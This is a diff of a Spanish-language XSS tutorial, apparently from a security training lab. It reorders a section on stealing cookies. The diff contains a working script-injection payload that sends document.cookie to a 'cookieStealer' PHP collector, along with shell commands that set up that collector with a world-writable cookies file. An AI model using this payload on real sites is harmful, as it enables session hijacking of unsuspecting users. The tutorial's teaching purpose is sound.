@@ -72,23 +72,26 @@ Podríamos redirigir a una página de phishing:
 
 ![](images/xss3.png)
 
-Podemos capturar cookies del usuario (en ataques reales):
 
-Crea en tu servidor web una carpeta con nombre cookieStealer y copias en el archivo index.php [este archivo php](files/steal.php)
+**Podemos capturar cookies del usuario (en ataques reales):**
+---
+Con esto, un atacante podría robar sesiones de usuarios.
+
+<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
+
+![](images/xss4.png)
+
+Si lo quieres ver, rea en tu servidor web una carpeta con nombre cookieStealer y copias en el archivo index.php [este archivo php](files/steal.php)
 
 ~~~
 mkdir /var/www/html/cookieStealer/
-mkdir /var/www/html/cookieStealer/index.php
+touch /var/www/html/cookieStealer/index.php
 mkdir /var/www/html/cookieStealer/cookies.txt
 chmod 777 /var/www/html/cookieStealer/cookies.txt
 
 ~~~
-`<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 
-Con esto, un atacante podría robar sesiones de usuarios.
-![](images/xss4.png)
-
-Ya que en el archivo cookie.txt del servidor del atacante se habrá guardado los datos de nuestra cookie:
+En el archivo cookie.txt del servidor del atacante se habrá guardado los datos de nuestra cookie:
 
 ![](images/xss8.png)
 
